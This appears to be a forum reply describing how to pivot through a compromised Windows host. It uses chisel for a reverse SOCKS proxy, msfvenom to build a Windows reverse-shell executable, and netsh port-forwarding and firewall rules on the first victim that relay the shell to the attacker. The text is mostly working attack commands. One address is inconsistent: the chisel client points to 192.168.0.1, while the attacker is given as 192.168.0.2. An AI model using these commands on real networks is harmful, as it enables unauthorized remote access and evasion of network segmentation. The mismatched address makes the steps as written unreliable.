I usually run chisel to proxy the traffic through a host but to catch a reverse shell through that same host I generally just port forward using built in windows commands.

So if you have something like:  
Attacking machine ([192.168.0.2](https://192.168.0.2/))  
Victim1 (external interface [192.168.0.3](https://192.168.0.3/) & internal interface [10.0.0.2](https://10.0.0.2/))  
Victim2 (only accessible via [10.0.0.3](https://10.0.0.3/))

I would first setup chisel for regular proxying of traffic:  
On Kali:

> sudo ./chisel server -v -p 8000 --reverse

> sudo echo “socks5 127.0.0.1 1080” >>/etc/proxychains4.conf

On Victim1:

> Chisel.exe client -v 192.168.0.1:8000 R:socks

Now let's say you need to catch a reverse shell on victim2 but you have to tunnel the shell through victim1:  
> msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.2 LPORT=443 -f exe > shell.exe  
Notice the LHOST is the internal interface of victim1 and port 443, which we now need to setup a forwarding rule so that anytime victim1 receives a connection from port 443 on its internal interface to forward it to my attacking host:  
On victim1:  
> netsh interface portproxy add v4tov4 listenport=443 listenaddress=10.0.0.2 connectport=8080 connectaddress=192.168.0.2  
> netsh advfirewall firewall add rule name="forward_port_rule" protocol=TCP dir=in localip=10.0.0.2 localport=443 action=allow  
The above commands are basically telling victim1 to listen on internal interface ([10.0.0.2](https://10.0.0.2/)) port 443 and forward that traffic to the connect address which is our attacking machine ([192.168.0.2](https://192.168.0.2/)) port 8080. Then you'd just setup a listener on port 8080 on kali and you'd catch the shell. The second command just allows the traffic through the local firewall.

Probably an easier way of doing it but that's how I've done it.